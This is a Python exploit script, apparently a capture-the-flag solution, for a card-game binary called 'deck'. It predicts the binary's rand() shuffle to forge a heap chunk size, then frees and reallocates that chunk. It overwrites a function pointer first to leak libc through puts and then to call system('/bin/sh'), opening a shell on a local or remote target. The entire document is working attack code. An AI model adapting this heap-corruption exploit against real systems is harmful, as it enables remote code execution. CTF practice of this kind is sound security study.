#!/usr/bin/env python
import sys
import ptrlib as ptr
import ctypes

exe = ptr.ELF("./deck_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")
cdll = ctypes.CDLL("./libc.so.6")
# cdll = ctypes.CDLL("/usr/lib64/libc.so.6")
# cdll = ctypes.CDLL("/usr/lib/libc.so.6")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        # return ptr.Socket("34.170.146.252", 37305)
        # return ptr.Socket("localhost", 5000)
        return ptr.Socket("172.17.0.1", 5000)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()
    cdll.srand(cdll.time(0))

    got_puts = unwrap(exe.got("puts"))
    plt_puts = unwrap(exe.plt("puts"))

    def play_game(suit: int, number: int):
        if suit < 1 or suit > 4:
            ptr.logger.error("invalid suit")
            exit()

        if number < 1 or number > 13:
            ptr.logger.error("invalid number")
            exit()

        dump = b""
        dump += io.sendlineafter("> ", "1")
        dump += io.sendlineafter("Guess the suit (1=♠ / 2=♦ / 3=♥ / 4=♣): ", str(suit))
        dump += io.sendlineafter("Guess the number (1-13): ", str(number))

        return dump

    def change_shuffle_method(method: int):
        io.sendlineafter("> ", "2")
        io.sendlineafter("1=Naive / 2=Fisher-Yates / 3=Sattolo: ", str(method))
        return

    def change_name(length: int, name: bytes):
        if len(name) > length:
            ptr.logger.error("invalid length of name")
            exit()

        io.sendlineafter("> ", "3")
        io.sendlineafter("Length: ", str(length))
        io.sendlineafter("Name: ", name)
        return

    deck = []
    for i in range(4):
        for j in range(13):
            deck.append((i, j))
    deck.append(())

    fake_chunk_size = 0
    change_shuffle_method(2)
    ptr.logger.info(f"changed shuffle method to Fisher-Yates")
    while True:
        for i in range(13 * 4, 0, -1):
            j = cdll.rand() % (i + 1)
            deck[i], deck[j] = deck[j], deck[i]
            continue
        play_game(1, 1)
        if deck[13 * 4] in [(1, 1), (2, 1), (3, 1)]:
            fake_chunk_size = deck[13 * 4][0] * 0x100 + deck[13 * 4][1]
            break
    ptr.logger.info(f"created fake chunk with size {hex(fake_chunk_size)}")

    change_name(0x18, b"A" * 0x18)
    ptr.logger.info("freed fake chunk")

    payload = b""
    payload += b"A" * 8 * 3
    payload += ptr.p64(0x21)
    payload += ptr.p64(plt_puts)  # overwrite shuffle function
    payload += ptr.p32(got_puts)  # overwrite deck -> rdi

    if fake_chunk_size == 0x101:
        change_name(0xF0, payload)
    elif fake_chunk_size == 0x201:
        change_name(0x1F0, payload)
    elif fake_chunk_size == 0x301:
        change_name(0x2F0, payload)
    ptr.logger.info("overwrited shuffle function and deck to leak libc")

    dump = play_game(1, 1)
    puts_offset = unwrap(libc.symbol("puts"))
    libc.base = ptr.u64(dump.split(b"AAAAAAAA!\n")[1][:6]) - puts_offset

    payload = b""
    payload += b"A" * 8 * 3
    payload += ptr.p64(0x21)
    payload += ptr.p64(unwrap(libc.symbol("system")))  # overwrite shuffle function
    payload += ptr.p64(next(libc.search("/bin/sh\x00")))  # overwrite deck -> rdi
    payload = payload[: len(payload) - 2]

    change_name(0x18, b"A" * 0x18)
    ptr.logger.info("freed fake chunk")

    if fake_chunk_size == 0x101:
        change_name(0xF0, payload)
    elif fake_chunk_size == 0x201:
        change_name(0x1F0, payload)
    elif fake_chunk_size == 0x301:
        change_name(0x2F0, payload)
    ptr.logger.info("overwrited shuffle function and deck to call system('/bin/sh')")

    io.sendlineafter("> ", "1")
    io.recvuntil("AAAA!\n")
    io.sh()
    return


if __name__ == "__main__":
    main()
